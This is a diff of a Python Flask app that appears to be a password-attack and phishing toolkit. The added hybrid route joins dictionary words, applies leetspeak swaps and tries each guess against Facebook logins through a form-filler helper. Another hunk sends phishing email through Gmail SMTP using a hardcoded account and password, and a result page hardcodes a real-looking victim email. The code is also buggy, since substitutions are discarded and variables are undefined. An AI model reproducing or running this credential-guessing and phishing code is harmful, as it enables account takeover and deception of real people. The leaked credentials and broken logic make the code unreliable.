@@ -22,7 +22,7 @@ def hybrid():
     cur = con.cursor()
     cur.execute("select * from PASSWORDS")
     rows = cur.fetchall()
-    return render_template('hybrid.html', rows = rows)    
+    return render_template('hybrid.html', rows = rows)
 @app.route('/dictionary')
 def dictionary():
     con = sqlite3.connect("passwords1.db")
@@ -31,23 +31,46 @@ def dictionary():
     cur.execute("select * from PASSWORDS")
     rows = cur.fetchall()
     return render_template('dictionary.html', rows = rows)
-@app.route('/rainbow')
-def rainbow():
-    return render_template('rainbow.html')
+
 @app.route('/passwordstrengthchecker')
 def passwordstrengthchecker():
     return render_template('passwordstrengthchecker.html')
 @app.route('/run_hybrid', methods = ['POST', 'GET'])
 def hybrid_alg():
-    con = sqlite3.connect("passwords1.db")
-    con.row_factory = sqlite3.Row
-    cur = con.cursor()
-    cur.execute("select * from PASSWORDS")
-    rows = cur.fetchall()
-    form = request.form
-    username = request.form['accusername']
-    website = request.form['website']
-    return render_template('hybrid.html')
+    username = request.form["accusername"]
+    dictionaryChunk = request.form["dictionary"]
+    dictionary = dictionaryChunk.split()
+    i = 0; 
+    while i < len(dictionary):
+        firstword = dictionary[i]
+        j = i + 1;
+        while j < len(dictionary):
+            secondword = dictionary[j]
+            comboword = firstword + secondword
+
+            if 's' in comboword:
+                comboword.replace('s', '$')
+            if 'e' in comboword:
+                comboword.replace('e', '3')
+            if 'l' in comboword:
+                comboword.replace('l', '1')
+            if 'a' in comboword:
+                comboword.replace('a', '@')
+            if 'o' in comboword:
+                comboword.replace('o', '0')
+
+        
+            found = facebook_form_filler(username, comboword)
+            if found:
+                password = word
+                break
+
+            j = j+1
+        i = i +1
+    if password != None:
+        return render_template('result.html',username = "tarabite@yahoo.com", password = password)
+    else:
+        return render_template('500_bf.html')
 @app.route('/phising')
 def phising():
     return render_template('phising.html')
@@ -142,22 +165,22 @@ def phising_alg():
     """
     # Record the MIME type text/html
     HTML_BODY = MIMEText(BODY, 'html')
- 
+
     # Attach parts into message container.
     # According to RFC 2046, the last part of a multipart message, in this case
     # the HTML message, is best and preferred.
     MESSAGE.attach(HTML_BODY)
- 
+
     # The actual sending of the e-mail
     server = smtplib.SMTP('smtp.gmail.com:587')
- 
+
     # Print debugging output when testing
     if __name__ == "__main__":
         server.set_debuglevel(1)
- 
+
     # Credentials (if needed) for sending the mail
     password = "g0buckeyes"
- 
+
     server.starttls()
     server.login("actualnotfaketwitter@gmail.com",password)
     server.sendmail("actualnotfaketwitter@gmail.com", [request.form["accusername"]], MESSAGE.as_string())
